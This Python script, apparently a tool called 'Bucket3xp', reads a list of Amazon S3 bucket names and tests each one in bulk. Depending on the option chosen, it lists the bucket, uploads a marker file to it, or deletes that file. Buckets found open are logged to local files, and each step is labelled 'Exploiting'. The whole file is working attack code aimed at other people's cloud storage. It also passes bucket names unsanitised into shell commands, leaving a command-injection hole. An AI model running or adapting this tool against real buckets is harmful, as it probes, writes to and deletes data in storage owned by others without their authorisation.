import os

def logo():
	print("""
######   ##      #    #####   ##    #   ########  ##########      ######   #     ##  #######
##    #  ##      #  ##     #  ##   #    ##            ##         #     ##   #   ##   ##     #
##    #  ##      #  ##        ##  #     ##            ##               ##    # ##    ##     #
######   ##      #  ##        ####      #####         ##           #####      ##     ## ####
##    #  ##      #  ##        ##  #     ##            ##               ##    ## #    ##
##    #  ##      #  ##     #  ##   #    ##            ##         #     ##   ##   #   ##
######     ######     #####   ##    #   ########      ##          ######   ##     #  ##

Coded By: SaadAhmed a.k.a InjectorPCA
	""")

def clearScreen():
	if os.name == "nt":
		os.system("cls")

	else:
		os.system("clear")

def runAgain():
	userInput = input("\nWant To Run Again Y/n: ").lower()
	
	if userInput.isalpha() and userInput == "y":
		clearScreen()
		logo()

		global fileName
		fileName = input("Enter List Buckets File Name: ")

		if os.path.isfile(fileName):
			bucket3xp()
			runAgain()
		
		else:
			print("\n\033[0;31mFile Not Found\033[1;m\n")
			runAgain()		

	else:
		exit("\nThanks For Using Bucket3xp ;)\n")	

def bucket3xp():

	f = open(fileName, 'r')

	blank = []
	n = 1
	t = 1
	r = 1

	for i in f:
		blank.append(i)
		
	blank.append("blank")	

	while(n <= len(blank)):	
		makeFile = open("{}.txt".format(n), 'w+')
		makeFile.write("Inside The B0x")
		n+=1

	print("""
\033[0;37m
[+] Enter 1 for Mass listDir Perm Checking
[+] Enter 2 for Mass Writeable Perm Checking
[+] Enter 3 for Mass Removeable Perm Checking 
\033[1;m\n
	""")

	try:
		option = int(input("_: "))

	except ValueError:
		print("\n\033[0;31mplease select valid option\033[1;m\n")
		runAgain()	

	else:
		print("")		

	if(option == 1):		

		while(t <= len(blank)):
			x = blank[int(t - 1)]
			print("\n[+] Exploiting {}".format(x))
			result = os.system("aws s3 ls s3://{}".format(x))
			if(result == 0):
				print('\n\033[0;31m[+] Readable Bucket Found http://{}.s3.amazonaws.com/\033[1;m\n'.format(x.rstrip()))
				openBucket = open("openBuckets.txt", "a")
				openBucket.write("{}".format(x))
			print()

			t+=1

	elif(option == 2):
		while(t <= len(blank)):
			x = blank[int(t - 1)]
			print("\n[+] Exploiting {}".format(x))
			result = os.system("aws s3 cp {}.txt s3://{}".format(t, x))
			if(result == 0):
				print('\n\033[0;31m[+] Writeable Bucket Found http://{}.s3.amazonaws.com/\033[1;m\n'.format(x.rstrip()))
				writeableBucket = open("writeableBuckets.txt", "a")
				writeableBucket.write("{}".format(x))

			t+=1

	elif(option == 3):
		while(t <= len(blank)):
			x = blank[int(t - 1)]
			print("\n[+] Exploiting {}".format(x))
			result = os.system("aws s3 rm s3://{}/{}.txt".format(x.rstrip() ,t))
			if(result == 0):
				print('\n\033[0;31m[+] File Deleted http://{}.s3.amazonaws.com/{}.txt\033[1;m\n'.format(x.rstrip(), t))

			t+=1		

	else:
		print("\n\033[0;31mPlease Enter Valid Option\033[1;m\n")			
		runAgain()

	while(r <= len(blank) - 1):
		if(os.path.isfile("{}.txt".format(r))):
			os.remove("{}.txt".format(r))
		r+=1
	runAgain()	

logo()

global fileName
fileName = input("Enter List Buckets File Name: ")

if os.path.isfile(fileName):
	bucket3xp()
else:	
	print("\n\033[0;31mFile Not Found\033[1;m\n")
	runAgain()								
